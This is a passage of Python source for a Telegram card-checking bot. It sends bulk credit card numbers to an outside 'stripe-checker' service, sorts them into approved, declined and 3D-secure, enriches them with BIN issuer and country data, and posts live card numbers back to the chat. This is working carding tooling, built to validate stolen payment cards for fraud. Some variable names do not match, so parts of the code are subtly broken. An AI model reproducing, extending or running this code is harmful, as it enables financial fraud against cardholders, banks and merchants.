            if stopuser_stxt.get(user_id, {}).get('status') == 'stop':
                elapsed = time.time() - start_all
                elapsed_formatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=message_id,
                    text=f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - stripe auth play ♻️\n\n"
                         f"- 𝐓𝐨𝐭𝐚𝐥 Found 𝐈𝐧𝐩𝐮𝐭 -  {total}\n"
                         f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 - {len(checked_cards)}\n"
                         f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ {approved}\n"
                         f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜{declined}\n"
                         f"• 3D Card 🏴‍☠️ ➜{otp_cards}\n"
                         f"Time: {elapsed_formatted}\n"
                         f"𝙎𝙏𝘼𝙏𝙐𝙎 ➜ Stop 🔴 All ✅\n",
                    parse_mode="HTML"        
                )
                return

            cc = cc.strip()
            if not cc or cc in checked_cards:
                continue

            start_time = time.time()
            try:
                url = f"https://stripe-checker-production.up.railway.app/v1/stripe/cc={cc}"
                response = requests.get(url, timeout=20)
                final = response.json()
                result = final.get("result", "Error")
                Gateway = final.get("gateway", "Unknown")
                card = final.get("card", "Error")
            except Exception:                    
                 result = "Error"
                 Gateway = "Unknown"
                 price = "Error"        
            execution_time = time.time() - start_time

            bin_info = get_bin_info_from_csv(cc[:6]) or {}
            brand = bin_info.get('brand', 'Unknown')
            card_type = bin_info.get('type', 'Unknown')
            country = bin_info.get('country', 'Unknown')
            country_flag = bin_info.get('flag', '🏳️')
            bank = bin_info.get('bank', 'Unknown')
            level = bin_info.get('level', 'Unknown')

            if any(x in result.lower() for x in ["funds", "invalid postal", "avs", "added", "duplicate", "approved", "purchase","action_required"]):
                approved += 1
                msg = f'''<b>Approved ✅

𝗖𝗮𝗿𝗱: <code>{cc}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲:  {gateway}
𝐑𝐞𝐬𝗽𝗼𝗻𝐬𝗲: {result}

𝗜𝗻𝗳𝗼: <code>{cc[:6]} - {card_type} - {brand} - {level}</code>
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝗧𝗶𝗺𝗲: {execution_time:.2f} seconds
</b>'''
                bot.send_message(message.chat.id, msg, parse_mode="HTML")

            elif any(x in result.lower() for x in ["3d_required", "otp", "action_required","3d","risk"]):
                otp_cards += 1
            else:
                declined += 1

            keyboard = InlineKeyboardMarkup(row_width=1)
            keyboard.add(
                InlineKeyboardButton(f"Status ➜ {result}", callback_data="noop"),
                InlineKeyboardButton(f"Approved ✅ ➜ {approved}", callback_data="noop"),
                InlineKeyboardButton(f"Declined ❌ ➜ {declined}", callback_data="noop"),
                InlineKeyboardButton(f"3D Card 🏴‍☠️ ➜ {otp_cards}", callback_data="noop"),
                InlineKeyboardButton(f"Total ♻ ➜ {len(checked_cards)}/{total}", callback_data="noop"),
                InlineKeyboardButton("Stop", callback_data=f"stopstxt_{user_id}")
            )

            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=message_id,
                text=f"Checking Card <code>{cc}</code>\nGate ➜ <b>stripe auth play </b>",
                reply_markup=keyboard,
                parse_mode="HTML"
            )

            time.sleep(1)
            checked_cards.add(cc)

        elapsed = time.time() - start_all
        elapsed_formatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))

        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=message_id,
            text=f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - stripe auth play ♻️\n\n"
                 f"- 𝐓𝐨𝐭𝐚𝐥 𝐂𝐂 𝐈𝐧𝐩𝐮𝐭 -  {total}\n"
                 f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜   {approved}\n"
                 f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜  {declined}\n"
                 f"• 3D Card 🏴‍☠️ ➜  {otp_cards}\n"
                 f"Time: {elapsed_formatted}\n"
                 f"𝐒𝐭𝐚𝐭𝐮𝐬 - Checked All ✅\n",
                 
            parse_mode="HTML"
        )        

    finally:
        active_checks_stxt[user_id] = max(0, active_checks_stxt.get(user_id, 1) - 1)
        stopuser_stxt.pop(user_id, None)


@bot.callback_query_handler(func=lambda call: call.data.startswith('stopstxt_'))
def stop_stxt(call):
    user_id = call.data.split('_')[1]
    if call.from_user.id == int(user_id):
        if user_id not in stopuser_stxt:
            stopuser_stxt[user_id] = {}
        stopuser_stxt[user_id]['status'] = 'stop'
        bot.answer_callback_query(call.id, "Stopping your check...")
    else:
        bot.answer_callback_query(call.id, "❌ You can't stop someone else's  check.")




print("Bot is running...")
bot.infinity_polling()

